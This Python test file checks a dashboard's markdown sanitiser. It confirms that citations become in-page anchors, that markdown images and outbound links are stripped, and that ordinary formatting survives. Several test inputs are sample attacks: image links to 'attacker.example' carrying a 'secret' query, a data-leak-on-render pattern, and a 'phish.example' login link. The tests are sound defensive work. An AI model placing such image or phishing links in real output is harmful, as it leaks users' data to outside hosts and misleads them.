import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "dashboard"))
from safety import safe_markdown  # noqa: E402


def test_citations_become_in_page_links():
    assert safe_markdown("Renew it [1][2].", "hybrid-") == \
        "Renew it [\[1\]](#hybrid-source-1)[\[2\]](#hybrid-source-2)."


def test_images_are_removed_so_nothing_is_fetched_on_render():
    out = safe_markdown("Done ![x](https://attacker.example/?q=secret) ok", "p-")
    assert "attacker.example" not in out and "image removed" in out


def test_reference_style_images_are_removed_too():
    out = safe_markdown("See ![logo][r]\n\n[r]: https://attacker.example/?q=secret\n", "p-")
    assert "attacker.example" not in out and "![" not in out


def test_outbound_links_become_plain_text():
    out = safe_markdown("Read [the docs](https://phish.example/login) now [1].", "p-")
    assert "phish.example" not in out and "the docs" in out and "(#p-source-1)" in out


def test_ordinary_markdown_and_code_survive():
    text = "Run `nimbus-vpn --renew-cert`, then **reconnect** [1].\n\n- step one\n- step two"
    out = safe_markdown(text, "h-")
    assert "`nimbus-vpn --renew-cert`" in out and "**reconnect**" in out and "- step two" in out


def test_back_to_back_citations_are_not_mistaken_for_reference_links():
    # "[1][2]" has the shape of a markdown reference link; a first version of the filter destroyed it.
    assert "(#h-source-1)" in safe_markdown("A [1][2].", "h-") and "(#h-source-2)" in safe_markdown("A [1][2].", "h-")
